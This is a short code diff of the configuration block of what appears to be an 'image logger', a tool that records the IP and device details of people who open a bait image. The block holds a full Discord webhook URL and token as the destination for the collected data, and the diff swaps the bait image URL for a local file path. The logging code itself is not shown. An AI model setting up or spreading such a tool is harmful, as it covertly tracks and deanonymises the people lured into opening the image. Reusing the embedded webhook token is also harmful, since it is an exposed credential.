@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1396948020897251358/QMm_bANDIqFg8N8_5cKpLV2G02QrZmzHp_f33GWHLx7smsJowZz0waeUngjT6woOsrCs",
-    "image": "https://generated-assets.prod.myninja.ai/fb37f8d3-c217-4797-8d10-8ae6a366554b/fbe4f9c5-ab3a-49f9-87bb-6b686429df0d_0.jpeg", # You can also have a custom image by using a URL argument
+    "image": "file:///D:/Rules-%20Ertlats%20crib.pdf", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
